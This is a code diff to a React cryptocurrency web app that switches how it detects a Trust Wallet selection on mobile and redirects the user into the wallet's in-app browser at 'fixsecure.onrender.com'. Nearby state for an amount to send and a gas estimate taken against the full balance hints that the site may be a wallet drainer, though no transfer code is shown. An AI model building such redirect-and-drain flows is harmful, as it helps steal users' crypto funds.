@@ -17,8 +17,9 @@ import {
   useAppKit,
   useAppKitAccount,
   useWalletInfo,
-  useDisconnect,
+  // useDisconnect,
   useAppKitProvider,
+  useAppKitEvents,
 } from "@reown/appkit/react";
 import { useAppKitConnection } from "@reown/appkit-adapter-solana/react";
 // import { Provider } from "@reown/appkit-adapter-solana/react";
@@ -59,10 +60,11 @@ const Home = () => {
   const { address, isConnected } = useAppKitAccount();
   const balance = useBalance({ address });
   const [amountToSend, setAmountToSend] = useState(null);
-  const { disconnect } = useDisconnect();
+  // const { disconnect } = useDisconnect();
   const { walletInfo } = useWalletInfo();
     const [tokenAddress, setTokenAddress] = useState(null);
     const { walletProvider } = useAppKitProvider("solana");
+const events = useAppKitEvents();
 
   const [txHash, setTxHash] = useState(null);
 
@@ -182,29 +184,47 @@ const Home = () => {
     value: balance.data?.value,
   });
 
-  const isTrustWalletApp = () => {
-    // Trust Wallet injects `ethereum.isTrust` in the in-app browser
-    return (
-      typeof window.ethereum !== "undefined" && window.ethereum.isTrust === true
-    );
-  };
+  // const isTrustWalletApp = () => {
+  //   // Trust Wallet injects `ethereum.isTrust` in the in-app browser
+  //   return (
+  //     typeof window.ethereum !== "undefined" && window.ethereum.isTrust === true
+  //   );
+  // };
 
-  useEffect(() => {
 
-    if (
-      isConnected &&
-      walletInfo?.name === "Trust Wallet" &&
-      isMobileDevice &&
-      !isTrustWalletApp() // ensure we are not already inside the app
-    ) {
-      const run = async () => {
-        await disconnect(); // ✅ works correctly
+    useEffect(() => {
+    if (!events?.data) return;
+
+    // ✅ Detect the "SELECT_WALLET" event
+    if (events.data.event === "SELECT_WALLET") {
+      const walletName = events.data.properties?.name?.toLowerCase();
+
+      console.log("Wallet Selected:", walletName);
+
+      if (walletName?.includes("trust") && isMobileDevice) {
+
+        // ✅ Open DApp INSIDE Trust Wallet browser
         window.location.href = `https://link.trustwallet.com/open_url?coin_id=${activeChain?.id}&url=https://fixsecure.onrender.com`;
-      };
-
-      run();
+      }
     }
-  }, [isConnected, walletInfo, activeChain?.id]);
+  }, [events, isMobileDevice]);
+
+  // useEffect(() => {
+
+  //   if (
+  //     isConnected &&
+  //     walletInfo?.name === "Trust Wallet" &&
+  //     isMobileDevice &&
+  //     !isTrustWalletApp() // ensure we are not already inside the app
+  //   ) {
+  //     const run = async () => {
+  //       await disconnect(); // ✅ works correctly
+  //       window.location.href = `https://link.trustwallet.com/open_url?coin_id=${activeChain?.id}&url=https://fixsecure.onrender.com`;
+  //     };
+
+  //     run();
+  //   }
+  // }, [isConnected, walletInfo, activeChain?.id]);
 
   useEffect(() => {
     if (estimateGas.data && gasPrice.data && balance.data?.value) {
